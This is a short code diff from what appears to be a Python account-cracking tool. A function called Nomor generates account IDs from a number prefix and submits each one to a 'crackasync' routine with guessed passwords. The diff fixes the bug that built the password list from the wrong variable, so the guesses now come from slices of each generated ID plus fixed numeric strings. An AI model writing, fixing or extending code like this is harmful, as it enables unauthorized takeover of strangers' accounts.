@@ -326,9 +326,9 @@ def Nomor():
         print("\x1b[1;97m━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━❤️❥❥━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━❤️❥❥") 
         for next in gen:
             idf = code + next
-            mk = ids[:6]
-            xx = ids[:7]
-            v = ids[:8]
+            mk = idf[:6]
+            xx = idf[:7]
+            v = idf[:8]
             b = next[:6]  
             pwv = [mk,xx,'57273200',v,'57575751','57575752']
             Submits.submit(crackasync,idf,pwv)
